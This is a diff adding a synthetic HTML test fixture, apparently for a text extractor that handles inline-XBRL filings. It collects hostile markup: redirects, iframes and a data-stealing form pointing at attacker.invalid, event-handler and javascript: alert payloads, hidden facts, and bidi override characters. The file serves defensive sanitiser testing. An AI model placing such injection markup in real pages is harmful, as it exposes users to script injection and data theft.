@@ -1,0 +1,28 @@
+<!-- SYNTHETIC: invented for tests, not SEC data -->
+<!DOCTYPE html>
+<html xmlns:ix="http://www.xbrl.org/2013/inlineXBRL">
+<head><title>head title text</title><meta http-equiv="refresh" content="0;url=https://attacker.invalid"><link rel="stylesheet" href="https://attacker.invalid/x.css"><base href="https://attacker.invalid/"><style>body{display:none}</style></head>
+<body onload="alert('body-handler')">
+<div style="display:none"><ix:header><ix:hidden><ix:nonNumeric name="dei:Secret">HIDDEN-XBRL-FACT</ix:nonNumeric></ix:hidden></ix:header></div>
+<ix:header><ix:references>HIDDEN-XBRL-REFERENCE</ix:references></ix:header>
+<script>document.write('SCRIPT-TEXT')</script>
+<noscript>NOSCRIPT-TEXT</noscript>
+<template>TEMPLATE-TEXT</template>
+<iframe src="https://attacker.invalid/frame">IFRAME-TEXT</iframe>
+<object data="https://attacker.invalid/o">OBJECT-TEXT</object>
+<svg onload="alert(1)"><text>SVG-TEXT</text></svg>
+<form action="https://attacker.invalid/steal"><input name="p" value="INPUT-VALUE"><button>BUTTON-TEXT</button><textarea>TEXTAREA-TEXT</textarea></form>
+<div style="display: none">INLINE-HIDDEN-TEXT</div>
+<p hidden>HIDDEN-ATTRIBUTE-TEXT</p>
+<!-- COMMENT-TEXT -->
+<h2 onclick="alert(2)">Visible heading</h2>
+<p onclick="alert(3)" style="color:red">Visible&nbsp;&nbsp;paragraph with   <b>bold</b> and <a href="javascript:alert(4)">a link</a>.</p>
+<p>Escaped markup stays as words: &lt;img src=x&gt;.</p>
+<div>Text with a zero&#8203;width space and a bidi&#8238; override.</div>
+<ul><li>First item</li><li><img src="https://attacker.invalid/p.png" onerror="alert(5)">Second item</li></ul>
+<table><tr><td>Revenue</td><td></td><td>$</td><td>1,234</td><td>&nbsp;</td><td>(</td><td>56</td><td>)</td><td>7.5</td><td>%</td></tr>
+<tr><td>&nbsp;</td><td></td></tr></table>
+<p>12</p>
+<p>F-12</p>
+<p>Last visible paragraph.</p>
+</body></html>
